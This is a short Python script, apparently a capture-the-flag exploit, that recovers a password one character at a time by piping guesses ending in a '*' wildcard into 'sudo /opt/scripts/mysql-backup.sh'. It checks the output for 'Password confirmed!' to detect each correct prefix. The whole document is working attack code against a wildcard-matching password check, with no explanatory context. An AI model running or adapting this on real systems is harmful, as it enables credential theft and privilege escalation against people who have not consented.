import subprocess
import string

combination = string.ascii_letters + string.digits
password = ""
while True:
    for char in combination:
        command = f"echo '{password+char}*' | sudo /opt/scripts/mysql-backup.sh"
        proc = subprocess.run(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "Password confirmed!" in proc.stdout:
            password += char
            print(password)
            break
    
print(password)
